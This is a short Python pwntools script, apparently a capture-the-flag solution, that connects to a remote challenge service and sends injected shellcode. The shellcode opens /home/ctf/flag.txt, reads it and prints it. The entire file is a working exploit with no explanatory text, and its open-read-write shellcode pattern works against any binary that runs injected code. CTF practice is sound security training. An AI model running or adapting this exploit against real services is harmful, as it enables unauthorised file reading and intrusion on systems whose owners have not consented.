from pwn import *
context(log_level='debug',os='linux',arch='amd64')

# io=process("./mymem")
io=remote("43.143.7.127",28391)
tp_addr=0x50000


shellcode=asm(shellcraft.open("/home/ctf/flag.txt"))+asm(shellcraft.read(3,tp_addr,50))+asm(shellcraft.write(1,tp_addr,50))
io.recvuntil(b"\n")
io.sendline(shellcode)
io.interactive()


